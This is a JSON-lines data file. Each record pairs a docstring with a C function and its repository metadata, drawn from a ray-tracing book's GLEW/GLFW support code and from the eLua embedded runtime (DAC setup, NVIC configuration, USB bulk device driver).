{"docstring": "/*\n * Search for name in the extensions string. Use of strstr()\n * is not sufficient because extension names can be prefixes of\n * other extension names. Could use strtok() but the constant\n * string returned by glGetString might be in read-only memory.\n */\n", "func_signal": "static GLboolean _glewSearchExtension (const char* name, const GLubyte *start, const GLubyte *end)", "code": "{\n  const GLubyte* p;\n  GLuint len = _glewStrLen((const GLubyte*)name);\n  p = start;\n  while (p < end)\n  {\n    GLuint n = _glewStrCLen(p, ' ');\n    if (len == n && _glewStrSame((const GLubyte*)name, p, n)) return GL_TRUE;\n    p += n+1;\n  }\n  return GL_FALSE;\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/sutil/glew.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "// Initialise timer\n//\n", "func_signal": "void _glfwInitTimerPOSIX(void)", "code": "{\n#if defined(CLOCK_MONOTONIC)\n    struct timespec ts;\n\n    if (clock_gettime(CLOCK_MONOTONIC, &ts) == 0)\n    {\n        _glfw.posix_time.monotonic = GLFW_TRUE;\n        _glfw.posix_time.frequency = 1000000000;\n    }\n    else\n#endif\n    {\n        _glfw.posix_time.monotonic = GLFW_FALSE;\n        _glfw.posix_time.frequency = 1000000;\n    }\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/src/posix_time.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "// Initialize WGL-specific extensions\n//\n", "func_signal": "static void loadWGLExtensions(void)", "code": "{\n    PIXELFORMATDESCRIPTOR pfd;\n    HGLRC rc;\n    HDC dc = GetDC(_glfw.win32.helperWindowHandle);;\n\n    _glfw.wgl.extensionsLoaded = GLFW_TRUE;\n\n    // NOTE: A dummy context has to be created for opengl32.dll to load the\n    //       OpenGL ICD, from which we can then query WGL extensions\n    // NOTE: This code will accept the Microsoft GDI ICD; accelerated context\n    //       creation failure occurs during manual pixel format enumeration\n\n    ZeroMemory(&pfd, sizeof(pfd));\n    pfd.nSize = sizeof(pfd);\n    pfd.nVersion = 1;\n    pfd.dwFlags = PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER;\n    pfd.iPixelType = PFD_TYPE_RGBA;\n    pfd.cColorBits = 24;\n\n    if (!SetPixelFormat(dc, ChoosePixelFormat(dc, &pfd), &pfd))\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"WGL: Failed to set pixel format for dummy context\");\n        return;\n    }\n\n    rc = wglCreateContext(dc);\n    if (!rc)\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"WGL: Failed to create dummy context\");\n        return;\n    }\n\n    if (!wglMakeCurrent(dc, rc))\n    {\n        wglDeleteContext(rc);\n\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"WGL: Failed to make dummy context current\");\n        return;\n    }\n\n    // NOTE: Functions must be loaded first as they're needed to retrieve the\n    //       extension string that tells us whether the functions are supported\n    _glfw.wgl.GetExtensionsStringEXT = (PFNWGLGETEXTENSIONSSTRINGEXTPROC)\n        wglGetProcAddress(\"wglGetExtensionsStringEXT\");\n    _glfw.wgl.GetExtensionsStringARB = (PFNWGLGETEXTENSIONSSTRINGARBPROC)\n        wglGetProcAddress(\"wglGetExtensionsStringARB\");\n    _glfw.wgl.CreateContextAttribsARB = (PFNWGLCREATECONTEXTATTRIBSARBPROC)\n        wglGetProcAddress(\"wglCreateContextAttribsARB\");\n    _glfw.wgl.SwapIntervalEXT = (PFNWGLSWAPINTERVALEXTPROC)\n        wglGetProcAddress(\"wglSwapIntervalEXT\");\n    _glfw.wgl.GetPixelFormatAttribivARB = (PFNWGLGETPIXELFORMATATTRIBIVARBPROC)\n        wglGetProcAddress(\"wglGetPixelFormatAttribivARB\");\n\n    // NOTE: WGL_ARB_extensions_string and WGL_EXT_extensions_string are not\n    //       checked below as we are already using them\n    _glfw.wgl.ARB_multisample =\n        extensionSupportedWGL(\"WGL_ARB_multisample\");\n    _glfw.wgl.ARB_framebuffer_sRGB =\n        extensionSupportedWGL(\"WGL_ARB_framebuffer_sRGB\");\n    _glfw.wgl.EXT_framebuffer_sRGB =\n        extensionSupportedWGL(\"WGL_EXT_framebuffer_sRGB\");\n    _glfw.wgl.ARB_create_context =\n        extensionSupportedWGL(\"WGL_ARB_create_context\");\n    _glfw.wgl.ARB_create_context_profile =\n        extensionSupportedWGL(\"WGL_ARB_create_context_profile\");\n    _glfw.wgl.EXT_create_context_es2_profile =\n        extensionSupportedWGL(\"WGL_EXT_create_context_es2_profile\");\n    _glfw.wgl.ARB_create_context_robustness =\n        extensionSupportedWGL(\"WGL_ARB_create_context_robustness\");\n    _glfw.wgl.EXT_swap_control =\n        extensionSupportedWGL(\"WGL_EXT_swap_control\");\n    _glfw.wgl.ARB_pixel_format =\n        extensionSupportedWGL(\"WGL_ARB_pixel_format\");\n    _glfw.wgl.ARB_context_flush_control =\n        extensionSupportedWGL(\"WGL_ARB_context_flush_control\");\n\n    wglMakeCurrent(dc, NULL);\n    wglDeleteContext(rc);\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/src/wgl_context.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "// Lua: dac.noise.setup( id, amplitude, period )\n", "func_signal": "static int dac_noise_setup( lua_State *L )", "code": "{\n  XMC_DAC_CH_CONFIG_t dac_config;\n  uint32_t output_scale = 0;\n  DAC_AMP_MILLI_VOLTS_t amp;\n  uint32_t freq;\n  unsigned id;\n\n  id = luaL_checkinteger( L, 1 );\n  if( !( id < NUM_DAC ) )\n    return luaL_error( L, \"dac %d does not exist\", ( unsigned )id );\n\n  amp = luaL_checkinteger( L, 2 );\n  if( amp < DAC_AMP_MILLI_VOLTS_17 || amp > DAC_AMP_MILLI_VOLTS_2200 )\n    return luaL_error( L, \"Invalid DAC amplitude setting\" );\n\n  freq = luaL_checkinteger( L, 3 );\n  if( freq <= 0 )\n    return luaL_error( L, \"DAC noise period must be > 0\" );\n\n  dac_config.data_type = XMC_DAC_CH_DATA_TYPE_SIGNED;\n  dac_config.output_negation = XMC_DAC_CH_OUTPUT_NEGATION_DISABLED;\n  dac_config.output_offset = 0U;\n\n  switch( amp )\n  {\n    case DAC_AMP_MILLI_VOLTS_1:\n    case DAC_AMP_MILLI_VOLTS_2:\n    case DAC_AMP_MILLI_VOLTS_4:\n    case DAC_AMP_MILLI_VOLTS_9:\n    case DAC_AMP_MILLI_VOLTS_17:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_128;\n      break;\n    case DAC_AMP_MILLI_VOLTS_34:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_64;\n      break;\n    case DAC_AMP_MILLI_VOLTS_69:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_32;\n      break;\n    case DAC_AMP_MILLI_VOLTS_138:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_16;\n      break;\n    case DAC_AMP_MILLI_VOLTS_275:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_8;\n      break;\n    case DAC_AMP_MILLI_VOLTS_550:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_4;\n      break;\n    case DAC_AMP_MILLI_VOLTS_1100:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_2;\n      break;\n    case DAC_AMP_MILLI_VOLTS_2200:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_NONE;\n      break;\n  }\n  dac_config.output_scale = output_scale;\n\n  XMC_DAC_CH_Init( ELUA_XMC_DAC, id, &dac_config );\n  XMC_DAC_CH_StartNoiseMode( ELUA_XMC_DAC, id, XMC_DAC_CH_TRIGGER_INTERNAL, (uint32_t)roundf(1000000/ freq));\n\n  return 0;\n\n}", "path": "elua/src/platform/xmc4000/dac.c", "commit_date": "2019-01-23 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "/**\n  * @brief  Selects the condition for the system to enter low power mode.\n  * @param  LowPowerMode: Specifies the new mode for the system to enter low power mode.\n  *   This parameter can be one of the following values:\n  *     @arg NVIC_LP_SEVONPEND: Low Power SEV on Pend.\n  *     @arg NVIC_LP_SLEEPDEEP: Low Power DEEPSLEEP request.\n  *     @arg NVIC_LP_SLEEPONEXIT: Low Power Sleep on Exit.\n  * @param  NewState: new state of LP condition. This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void NVIC_SystemLPConfig(uint8_t LowPowerMode, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_NVIC_LP(LowPowerMode));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));  \n  \n  if (NewState != DISABLE)\n  {\n    SCB->SCR |= LowPowerMode;\n  }\n  else\n  {\n    SCB->SCR &= (uint32_t)(~(uint32_t)LowPowerMode);\n  }\n}", "path": "elua/src/platform/stm32f4/FWLib/library/src/misc.c", "commit_date": "2013-05-28 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n// This function is called by the USB device stack whenever the bus is taken\n// out of suspend state.\n//\n//*****************************************************************************\n", "func_signal": "static void\nHandleResume(void *pvInstance)", "code": "{\n    const tUSBDBulkDevice *psBulkDevice;\n\n    ASSERT(pvInstance != 0);\n\n    //\n    // Create the instance pointer.\n    //\n    psBulkDevice = (const tUSBDBulkDevice *)pvInstance;\n\n    //\n    // Pass the event on to the client.\n    //\n    psBulkDevice->pfnRxCallback(psBulkDevice->pvRxCBData, USB_EVENT_RESUME, 0,\n                                (void *)0);\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "// Lua: dac.pattern.setup( id, pattern, amplitude, freq )\n// Raman: How about the DAC offsets? You can generate some really\n// strange signals with it!\n", "func_signal": "static int dac_pattern_setup( lua_State *L )", "code": "{\n  XMC_DAC_CH_CONFIG_t dac_config;\n  uint32_t output_scale = 0;\n  int field; // Which field are we handling ( 0 - 8 )\n  uint8_t pat[ DAC_PATTERN_FIELDS ];\n  DAC_AMP_MILLI_VOLTS_t amp;\n  uint32_t freq;\n  unsigned id;\n  uint8_t patval;\n\n  id = luaL_checkinteger( L, 1 );\n  if( !( id < NUM_DAC ) )\n    return luaL_error( L, \"dac %d does not exist\", ( unsigned )id );\n\n  luaL_checktype( L, 2, LUA_TTABLE );\n  if( lua_objlen( L, 2) != DAC_PATTERN_FIELDS )\n    return luaL_error( L, \"Pattern length must be 9 (PAT0, .. PAT8)\" );\n  for( field = 0; field < DAC_PATTERN_FIELDS; field++ )\n  {\n    lua_pushinteger( L, field + 1 );\n    lua_gettable( L, 2 );\n    if( lua_isnumber( L, -1 ) )\n    {\n      patval = ( uint8_t )lua_tonumber( L, -1 );\n      if( patval < 0 || patval > 31 )\n\treturn luaL_error( L, \"DAC's 5-bit pattern values must be between 0 - 31\" );\n      pat[ field ] = patval;\n    }\n    else\n    {\n      return luaL_error( L, \"DAC pattern: Expected number ( 0 - 31 )\" );\n    }\n    lua_pop( L, 1 );\n  }\n\n  amp = luaL_checkinteger( L, 3 );\n  if( amp < DAC_AMP_MILLI_VOLTS_1 || amp > DAC_AMP_MILLI_VOLTS_2200 )\n    return luaL_error( L, \"Invalid DAC amplitude setting\" );\n\n  freq = luaL_checkinteger( L, 4 );\n  if( freq <= 0 )\n    return luaL_error( L, \"DAC frequency must be > 0\" );\n\n  dac_config.data_type = XMC_DAC_CH_DATA_TYPE_SIGNED;\n  dac_config.output_negation = XMC_DAC_CH_OUTPUT_NEGATION_DISABLED;\n  dac_config.output_offset = 0U;\n\n  switch( amp )\n  {\n    case DAC_AMP_MILLI_VOLTS_1:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_32;\n      break;\n    case DAC_AMP_MILLI_VOLTS_2:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_16;\n      break;\n    case DAC_AMP_MILLI_VOLTS_4:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_8;\n      break;\n    case DAC_AMP_MILLI_VOLTS_9:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_4;\n      break;\n    case DAC_AMP_MILLI_VOLTS_17:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_DIV_2;\n      break;\n    case DAC_AMP_MILLI_VOLTS_34:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_NONE;\n      break;\n    case DAC_AMP_MILLI_VOLTS_69:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_MUL_2;\n      break;\n    case DAC_AMP_MILLI_VOLTS_138:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_MUL_4;\n      break;\n    case DAC_AMP_MILLI_VOLTS_275:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_MUL_8;\n      break;\n    case DAC_AMP_MILLI_VOLTS_550:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_MUL_16;\n      break;\n    case DAC_AMP_MILLI_VOLTS_1100:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_MUL_32;\n      break;\n    case DAC_AMP_MILLI_VOLTS_2200:\n      output_scale = XMC_DAC_CH_OUTPUT_SCALE_MUL_64;\n      break;\n  }\n  dac_config.output_scale = output_scale;\n\n  XMC_DAC_CH_Init( ELUA_XMC_DAC, id, &dac_config );\n  XMC_DAC_CH_StartPatternMode( ELUA_XMC_DAC, id, pat, XMC_DAC_CH_PATTERN_SIGN_OUTPUT_DISABLED, XMC_DAC_CH_TRIGGER_INTERNAL, freq );\n  //XMC_DAC_CH_SetMode( ELUA_XMC_DAC, id, XMC_DAC_CH_MODE_IDLE );\n\n  return 0;\n  \n}", "path": "elua/src/platform/xmc4000/dac.c", "commit_date": "2019-01-23 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "// Lua: dac.pattern.start( id )\n", "func_signal": "static int dac_pattern_start( lua_State *L )", "code": "{\n  unsigned id;\n\n  id = luaL_checkinteger( L, 1 );\n  if( !( id < NUM_DAC ) )\n    return luaL_error( L, \"dac %d does not exist\", ( unsigned )id );\n  XMC_DAC_CH_EnableOutput( ELUA_XMC_DAC, id );\n  return 0;\n}", "path": "elua/src/platform/xmc4000/dac.c", "commit_date": "2019-01-23 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n// Receives notifications related to data received from the host.\n//\n// \\param psDevice is the device instance whose endpoint is to be processed.\n// \\param ulStatus is the USB interrupt status that caused this function to\n// be called.\n//\n// This function is called from HandleEndpoints for all interrupts signaling\n// the arrival of data on the bulk OUT endpoint (in other words, whenever the\n// host has sent us a packet of data).  We inform the client that a packet\n// is available and, on return, check to see if the packet has been read.  If\n// not, we schedule another notification to the client for a later time.\n//\n// \\return Returns \\b true on success or \\b false on failure.\n//\n//*****************************************************************************\n", "func_signal": "static tBoolean\nProcessDataFromHost(const tUSBDBulkDevice *psDevice, unsigned long ulStatus)", "code": "{\n    unsigned long ulEPStatus;\n    unsigned long ulSize;\n    tBulkInstance *psInst;\n\n    //\n    // Get a pointer to our instance data.\n    //\n    psInst = psDevice->psPrivateBulkData;\n\n    //\n    // Get the endpoint status to see why we were called.\n    //\n    ulEPStatus = MAP_USBEndpointStatus(USB0_BASE, psInst->ucOUTEndpoint);\n\n    //\n    // Clear the status bits.\n    //\n    MAP_USBDevEndpointStatusClear(USB0_BASE, psInst->ucOUTEndpoint, ulEPStatus);\n\n    //\n    // Has a packet been received?\n    //\n    if(ulEPStatus & USB_DEV_RX_PKT_RDY)\n    {\n        //\n        // Set the flag we use to indicate that a packet read is pending.  This\n        // will be cleared if the packet is read.  If the client doesn't read\n        // the packet in the context of the USB_EVENT_RX_AVAILABLE callback,\n        // the event will be signaled later during tick processing.\n        //\n        SetDeferredOpFlag(&psInst->usDeferredOpFlags, BULK_DO_PACKET_RX, true);\n\n        //\n        // How big is the packet we've just been sent?\n        //\n        ulSize = MAP_USBEndpointDataAvail(psInst->ulUSBBase,\n                                          psInst->ucOUTEndpoint);\n\n        //\n        // The receive channel is not blocked so let the caller know\n        // that a packet is waiting.  The parameters are set to indicate\n        // that the packet has not been read from the hardware FIFO yet.\n        //\n        psDevice->pfnRxCallback(psDevice->pvRxCBData,\n                                USB_EVENT_RX_AVAILABLE, ulSize,\n                                (void *)0);\n    }\n    else\n    {\n        //\n        // No packet was received.  Some error must have been reported.  Check\n        // and pass this on to the client if necessary.\n        //\n        if(ulEPStatus & USB_RX_ERROR_FLAGS)\n        {\n            //\n            // This is an error we report to the client so...\n            //\n            psDevice->pfnRxCallback(psDevice->pvRxCBData,\n                                    USB_EVENT_ERROR,\n                                    (ulEPStatus & USB_RX_ERROR_FLAGS),\n                                    (void *)0);\n        }\n        return(false);\n    }\n\n    return(true);\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n// This function is called periodically and provides us with a time reference\n// and method of implementing delayed or time-dependent operations.\n//\n// \\param ulIndex is the index of the USB controller for which this tick\n// is being generated.\n// \\param ulTimemS is the elapsed time in milliseconds since the last call\n// to this function.\n//\n// \\return None.\n//\n//*****************************************************************************\n", "func_signal": "static void\nBulkTickHandler(void *pvInstance, unsigned long ulTimemS)", "code": "{\n    tBulkInstance *psInst;\n    unsigned long ulSize;\n    const tUSBDBulkDevice *psDevice;\n\n    ASSERT(pvInstance != 0);\n\n    //\n    // Create the instance pointer.\n    //\n    psDevice = (const tUSBDBulkDevice *)pvInstance;\n\n    //\n    // Get our instance data pointer.\n    //\n    psInst = psDevice->psPrivateBulkData;\n\n    //\n    // Do we have a deferred receive waiting\n    //\n    if(psInst->usDeferredOpFlags & (1 << BULK_DO_PACKET_RX))\n    {\n        //\n        // Yes - how big is the waiting packet?\n        //\n        ulSize = MAP_USBEndpointDataAvail(psInst->ulUSBBase,\n                                          psInst->ucOUTEndpoint);\n\n        //\n        // Tell the client that there is a packet waiting for it.\n        //\n        psDevice->pfnRxCallback(psDevice->pvRxCBData, USB_EVENT_RX_AVAILABLE,\n                                ulSize, (void *)0);\n    }\n\n    return;\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "/**\n  * @brief  Sets the vector table location and Offset.\n  * @param  NVIC_VectTab: specifies if the vector table is in RAM or FLASH memory.\n  *   This parameter can be one of the following values:\n  *     @arg NVIC_VectTab_RAM: Vector Table in internal SRAM.\n  *     @arg NVIC_VectTab_FLASH: Vector Table in internal FLASH.\n  * @param  Offset: Vector Table base offset field. This value must be a multiple of 0x200.\n  * @retval None\n  */\n", "func_signal": "void NVIC_SetVectorTable(uint32_t NVIC_VectTab, uint32_t Offset)", "code": "{ \n  /* Check the parameters */\n  assert_param(IS_NVIC_VECTTAB(NVIC_VectTab));\n  assert_param(IS_NVIC_OFFSET(Offset));  \n   \n  SCB->VTOR = NVIC_VectTab | (Offset & (uint32_t)0x1FFFFF80);\n}", "path": "elua/src/platform/stm32f4/FWLib/library/src/misc.c", "commit_date": "2013-05-28 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n// Device instance specific handler.\n//\n//*****************************************************************************\n", "func_signal": "static void\nHandleDevice(void *pvInstance, unsigned long ulRequest, void *pvRequestData)", "code": "{\n    tBulkInstance *psInst;\n    unsigned char *pucData;\n\n    //\n    // Create the serial instance data.\n    //\n    psInst = ((tUSBDBulkDevice *)pvInstance)->psPrivateBulkData;\n\n    //\n    // Create the char array used by the events supported by the USB CDC\n    // serial class.\n    //\n    pucData = (unsigned char *)pvRequestData;\n\n    switch(ulRequest)\n    {\n        //\n        // This was an interface change event.\n        //\n        case USB_EVENT_COMP_IFACE_CHANGE:\n        {\n            psInst->ucInterface = pucData[1];\n            break;\n        }\n\n        //\n        // This was an endpoint change event.\n        //\n        case USB_EVENT_COMP_EP_CHANGE:\n        {\n            //\n            // Determine if this is an IN or OUT endpoint that has changed.\n            //\n            if(pucData[0] & USB_EP_DESC_IN)\n            {\n                psInst->ucINEndpoint = INDEX_TO_USB_EP((pucData[1] & 0x7f));\n            }\n            else\n            {\n                //\n                // Extract the new endpoint number.\n                //\n                psInst->ucOUTEndpoint = INDEX_TO_USB_EP(pucData[1] & 0x7f);\n            }\n            break;\n        }\n        default:\n        {\n            break;\n        }\n    }\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//!\n//! \\param pvInstance is the pointer to the device instance structure as\n//! returned by USBDBulkInit().\n//! \\param pvCBData is the pointer that client wishes to be provided on each\n//! event sent to the transmit channel callback function.\n//!\n//! The client uses this function to change the callback pointer passed in\n//! the first parameter on all callbacks to the \\e pfnTxCallback function\n//! passed on USBDBulkInit().\n//!\n//! If a client wants to make runtime changes in the callback pointer, it must\n//! ensure that the \\e pvInstance structure passed to USBDBulkInit() resides in\n//! RAM.  If this structure is in flash, callback pointer changes will not be\n//! possible.\n//!\n//! \\return Returns the previous callback pointer that was being used for\n//! this instance's transmit callback.\n//\n//*****************************************************************************\n", "func_signal": "void *\nUSBDBulkSetTxCBData(void *pvInstance, void *pvCBData)", "code": "{\n    void *pvOldValue;\n\n    ASSERT(pvInstance);\n\n    //\n    // Set the callback pointer for the transmit channel after remembering the\n    // previous value.\n    //\n    pvOldValue = ((tUSBDBulkDevice *)pvInstance)->pvTxCBData;\n    ((tUSBDBulkDevice *)pvInstance)->pvTxCBData = pvCBData;\n\n    //\n    // Return the previous callback pointer value.\n    //\n    return(pvOldValue);\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//! returned by USBDBulkInit().\n//! \\param pcData points to a buffer into which the received data will be\n//! written.\n//! \\param ulLength is the size of the buffer pointed to by pcData.\n//! \\param bLast indicates whether the client will make a further call to\n//! read additional data from the packet.\n//!\n//! This function reads up to \\e ulLength bytes of data received from the USB\n//! host into the supplied application buffer.  If the driver detects that the\n//! entire packet has been read, it is acknowledged to the host.\n//!\n//! The \\e bLast parameter is ignored in this implementation since the end of\n//! a packet can be determined without relying upon the client to provide\n//! this information.\n//!\n//! \\return Returns the number of bytes of data read.\n//\n//*****************************************************************************\n", "func_signal": "unsigned long\nUSBDBulkPacketRead(void *pvInstance, unsigned char *pcData,\n                   unsigned long ulLength, tBoolean bLast)", "code": "{\n    unsigned long ulEPStatus, ulCount, ulPkt;\n    tBulkInstance *psInst;\n    long lRetcode;\n\n    ASSERT(pvInstance);\n\n    //\n    // Get our instance data pointer\n    //\n    psInst = ((tUSBDBulkDevice *)pvInstance)->psPrivateBulkData;\n\n    //\n    // Does the relevant endpoint FIFO have a packet waiting for us?\n    //\n    ulEPStatus = MAP_USBEndpointStatus(psInst->ulUSBBase,\n                                       psInst->ucOUTEndpoint);\n\n    if(ulEPStatus & USB_DEV_RX_PKT_RDY)\n    {\n        //\n        // How many bytes are available for us to receive?\n        //\n        ulPkt = MAP_USBEndpointDataAvail(psInst->ulUSBBase,\n                                         psInst->ucOUTEndpoint);\n\n        //\n        // Get as much data as we can.\n        //\n        ulCount = ulLength;\n        lRetcode = MAP_USBEndpointDataGet(psInst->ulUSBBase,\n                                          psInst->ucOUTEndpoint,\n                                          pcData, &ulCount);\n\n        //\n        // Did we read the last of the packet data?\n        //\n        if(ulCount == ulPkt)\n        {\n            //\n            // Clear the endpoint status so that we know no packet is\n            // waiting.\n            //\n            MAP_USBDevEndpointStatusClear(psInst->ulUSBBase,\n                                          psInst->ucOUTEndpoint,\n                                          ulEPStatus);\n\n            //\n            // Acknowledge the data, thus freeing the host to send the\n            // next packet.\n            //\n            MAP_USBDevEndpointDataAck(psInst->ulUSBBase, psInst->ucOUTEndpoint,\n                                      true);\n\n            //\n            // Clear the flag we set to indicate that a packet read is\n            // pending.\n            //\n            SetDeferredOpFlag(&psInst->usDeferredOpFlags, BULK_DO_PACKET_RX,\n                              false);\n        }\n\n        //\n        // If all went well, tell the caller how many bytes they got.\n        //\n        if(lRetcode != -1)\n        {\n            return(ulCount);\n        }\n    }\n\n    //\n    // No packet was available or an error occurred while reading so tell\n    // the caller no bytes were returned.\n    //\n    return(0);\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//!\n//! \\param pvInstance is the pointer to the bulk device instance structure.\n//!\n//! When the bus is suspended, an application which supports remote wake up\n//! (advertised to the host via the configuration descriptor) may call this function\n//! to initiate remote wake up signaling to the host.  If the remote wake up\n//! feature has not been disabled by the host, this will cause the bus to\n//! resume operation within 20mS.  If the host has disabled remote wake up,\n//! \\b false will be returned to indicate that the wake up request was not\n//! successful.\n//!\n//! \\return Returns \\b true if the remote wake up is not disabled and the\n//! signaling was started or \\b false if remote wake up is disabled or if\n//! signaling is currently ongoing following a previous call to this function.\n//\n//*****************************************************************************\n", "func_signal": "tBoolean\nUSBDBulkRemoteWakeupRequest(void *pvInstance)", "code": "{\n    ASSERT(pvInstance);\n\n    //\n    // Pass the request through to the lower layer.\n    //\n    return(USBDCDRemoteWakeupRequest(0));\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n//! Determines whether a packet is available and, if so, the size of the\n//! buffer required to read it.\n//!\n//! \\param pvInstance is the pointer to the device instance structure as\n//! returned by USBDBulkInit().\n//!\n//! This function may be used to determine if a received packet remains to be\n//! read and allows the application to determine the buffer size needed to\n//! read the data.\n//!\n//! \\return Returns 0 if no received packet remains unprocessed or the\n//! size of the packet if a packet is waiting to be read.\n//\n//*****************************************************************************\n", "func_signal": "unsigned long\nUSBDBulkRxPacketAvailable(void *pvInstance)", "code": "{\n    unsigned long ulEPStatus;\n    unsigned long ulSize;\n    tBulkInstance *psInst;\n\n    ASSERT(pvInstance);\n\n    //\n    // Get our instance data pointer\n    //\n    psInst = ((tUSBDBulkDevice *)pvInstance)->psPrivateBulkData;\n\n    //\n    // Does the relevant endpoint FIFO have a packet waiting for us?\n    //\n    ulEPStatus = MAP_USBEndpointStatus(psInst->ulUSBBase,\n                                       psInst->ucOUTEndpoint);\n\n    if(ulEPStatus & USB_DEV_RX_PKT_RDY)\n    {\n        //\n        // Yes - a packet is waiting.  How big is it?\n        //\n        ulSize = MAP_USBEndpointDataAvail(psInst->ulUSBBase,\n                                          psInst->ucOUTEndpoint);\n\n        return(ulSize);\n    }\n    else\n    {\n        //\n        // There is no packet waiting to be received.\n        //\n        return(0);\n    }\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
{"docstring": "//*****************************************************************************\n//\n//! Returns the number of free bytes in the transmit buffer.\n//!\n//! \\param pvInstance is the pointer to the device instance structure as\n//! returned by USBDBulkInit().\n//!\n//! This function returns the maximum number of bytes that can be passed on a\n//! call to USBDBulkPacketWrite and accepted for transmission.  The value\n//! returned will be the maximum USB packet size (64) if no transmission is\n//! currently outstanding or 0 if a transmission is in progress.\n//!\n//! \\return Returns the number of bytes available in the transmit buffer.\n//\n//*****************************************************************************\n", "func_signal": "unsigned long\nUSBDBulkTxPacketAvailable(void *pvInstance)", "code": "{\n    tBulkInstance *psInst;\n\n    ASSERT(pvInstance);\n\n    //\n    // Get our instance data pointer.\n    //\n    psInst = ((tUSBDBulkDevice *)pvInstance)->psPrivateBulkData;\n\n    //\n    // Do we have a packet transmission currently ongoing?\n    //\n    if(psInst->eBulkTxState != BULK_STATE_IDLE)\n    {\n        //\n        // We are not ready to receive a new packet so return 0.\n        //\n        return(0);\n    }\n    else\n    {\n        //\n        // We can receive a packet so return the max packet size for the\n        // relevant endpoint.\n        //\n        return(DATA_IN_EP_MAX_SIZE);\n    }\n}", "path": "elua/src/platform/lm3s/usblib/device/usbdbulk.c", "commit_date": "2011-07-21 00:00:00", "repo_name": "elua/elua", "stars": 881, "license": "other", "language": "c", "size": 14607}
